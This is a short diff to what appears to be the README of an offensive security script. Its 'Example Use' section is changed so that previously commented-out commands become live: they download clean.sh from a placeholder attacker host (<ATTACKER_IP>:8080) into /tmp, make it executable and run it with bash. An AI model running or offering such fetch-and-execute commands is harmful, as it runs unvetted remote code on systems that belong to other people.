@@ -27,6 +27,8 @@ Do not use on production environments or without permission.
 
 💡 Example Use
 
-#wget http://<ATTACKER_IP>:8080/clean.sh -O /tmp/clean.sh
-#chmod +x /tmp/clean.sh
-#bash /tmp/clean.sh
+#
+wget http://<ATTACKER_IP>:8080/clean.sh -O /tmp/clean.sh
+chmod +x /tmp/clean.sh
+bash /tmp/clean.sh
+#
